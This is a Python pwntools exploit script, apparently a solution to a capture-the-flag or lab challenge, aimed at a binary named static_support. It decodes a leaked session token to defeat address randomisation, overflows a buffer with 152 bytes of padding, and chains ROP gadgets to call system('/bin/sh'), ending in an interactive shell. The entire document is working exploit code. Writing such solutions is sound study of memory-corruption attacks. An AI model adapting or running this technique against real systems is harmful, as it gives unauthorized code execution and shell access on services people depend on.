#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./build/static_support", checksec=False)
elf = context.binary

HOST = args.get("HOST", "127.0.0.1")
PORT = int(args.get("PORT", 1337))


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def main():
    io = start()

    io.sendlineafter(b">", b"1")
    line = io.recvline_contains(b"Session token")
    token = int(line.strip().split()[-1], 16)

    leak = (token - 0x1337) ^ 0x5A5AA5A5AA55AA55
    base = leak - elf.symbols["banner"]
    log.info(f"leak=0x{leak:x} base=0x{base:x}")

    rop = ROP(elf)
    ret = rop.find_gadget(["ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    system = elf.symbols["system"]
    binsh = next(elf.search(b"/bin/sh"))

    payload = b"A" * 152
    payload += p64(base + ret)  # stack align
    payload += p64(base + pop_rdi)
    payload += p64(base + binsh)
    payload += p64(base + system)

    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"(max 512)", b"400")
    io.send(payload)

    io.interactive()


if __name__ == "__main__":
    main()
